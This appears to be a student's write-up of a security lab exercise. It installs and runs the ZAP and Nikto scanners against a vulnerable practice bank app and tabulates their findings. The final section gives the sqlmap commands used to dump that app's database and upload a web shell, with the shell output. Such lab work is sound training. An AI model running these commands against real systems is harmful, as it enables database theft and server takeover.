### Exercise 2: Black-Box Web Application Vulnerability Testing




__1. Download two web vulnerability scanners and describe the all needed set-up environment
settings__
__solution :__
1. Owasp Zed Attack Proxy (Linux) (Avaialble in `kali Linux`)
   - Download the program from https://www.zaproxy.org/download/ , and select the Linux installer
   - run the file `./ZAP_2_10_0_unix.sh`
   - after successfull installation run the file from command line `$: zapproxy`
   - An gui app will be opened if ran without errors.
   
![zap_interface](../task3/images/zap_interface.PNG)


2. Nikto Vulnerabuility Scanner
- A command line web vulnerability scanner

```bash
git clone https://github.com/sullo/nikto
# Main script is in program/
cd nikto/program
# Run using the shebang interpreter
./nikto.pl -h http://www.vbank.com
# Run using perl (if you forget to chmod)
perl nikto.pl -h http://www.vbank.com

# to use the proxy
perl nikto.pl -h http://www.vbank.com -useproxy
```
  - Avialble by Default in Kali installation
  - Run the application `nikto -h http://vbank.com`

![nikto_sample_usage](../task3/images/nikto_sample.PNG)




__2. Report how you found the different vulnerabilities: SQLi, XSS, etc.__
__solution__
1. Nikto Vulnerability Scanner
   - Run the nikto from command line with `--host` switch for host url

![nikto_results](../task3/images/nikto_results.PNG)

- Vulnerabilities/info found:
1. Clickjacking
2. Cross site scripting
3. Directory traversal
4. cookie without httponly flag
5. Server information in response headers



2. Owasp Zap vulnerability scanner
-  run the zapproxy `zapproxy` and click on the `automated scan`
![zed attack proxy](../task3/images/zap_intro.png)
<br>
- Results



**ZAP Scanning Report**

**Summary of Alerts**

| Risk Level | Number of Alerts |
| --- | --- |
| High | 1 |
| Medium | 1 |
| Low | 4 |
| Informational | 2 |

**Alerts (From Scan Report)**

| Name | Risk Level | Number of Instances |
| --- | --- | --- | 
| Cross Site Scripting (DOM Based) | High | 1 | 
| X-Frame-Options Header Not Set | Medium | 3 | 
| Absence of Anti-CSRF Tokens | Low | 3 | 
| Cookie No HttpOnly Flag | Low | 1 | 
| Cookie Without SameSite Attribute | Low | 1 | 
| X-Content-Type-Options Header Missing | Low | 19 | 
| Information Disclosure - Sensitive Information in URL | Informational | 3 | 
| Information Disclosure - Suspicious Comments | Informational | 1 | 

**Alerts (Manual test comparing ZAP)**

| Name | Risk Level | Number of Instances | **False Positive**
| --- | --- | --- | --- | 
| Cross Site Scripting (DOM Based) | High | 1 | **Yes**|
| X-Frame-Options Header Not Set | Medium | 3 | **No**|
| Absence of Anti-CSRF Tokens | Low | 3 | **No**|
| Cookie No HttpOnly Flag | Low | 1 | **No**|
| Cookie Without SameSite Attribute | Low | 1 | **No**|
| X-Content-Type-Options Header Missing | Low | 19 | **No**|
| Information Disclosure - Sensitive Information in URL | Informational | 3 | **No**|
| Information Disclosure - Suspicious Comments | Informational | 1 | **No**|


__3. Now you have collected enough information about the victim web application and found
multiple serious SQL injection vulnerabilities.
Use an automatic exploitation tool (e.g. sqlmap) to dump all the database, upload a web shell
and prove that you have control of the bank server!__

- Using `sqlmap` to find sql injection and dump database content
- Usage
```bash
$: sqlmap -u 'http://192.168.37.128/login.php?username=alex' --dbs
```
__Result:__

![sqlmap_dbs](../task3/images/sqlmap_dbs.PNG)

- Found `vbank` database (along with others)
- use `--dump` as switch and dump the contents of database `vbank` with `-D` switch


```bash
└─$ sqlmap -u 'http://192.168.37.128/login.php?username=alex' -D vbank --dump            
```


- Uploading a shell


```bash
$ sqlmap -u 'http://192.168.37.128/login.php?username=alex' --os-shell                          
                                   
[06:23:50] [INFO] the file stager has been successfully uploaded on '/var/www/htdocs/' - http://192.168.37.128:80/tmpuxstl.php
[06:23:50] [INFO] the backdoor has been successfully uploaded on '/var/www/htdocs/' - http://192.168.37.128:80/tmpbjcpu.php
[06:23:50] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> whoami
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'www-data'
os-shell> id
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
os-shell> 

```

> This is on condition that we have write permission on **`www`** directroy.

> Initially, sqlmap threw an error **`unable to upload shell as the user have may not have right permissions to the sepcifed directory`**




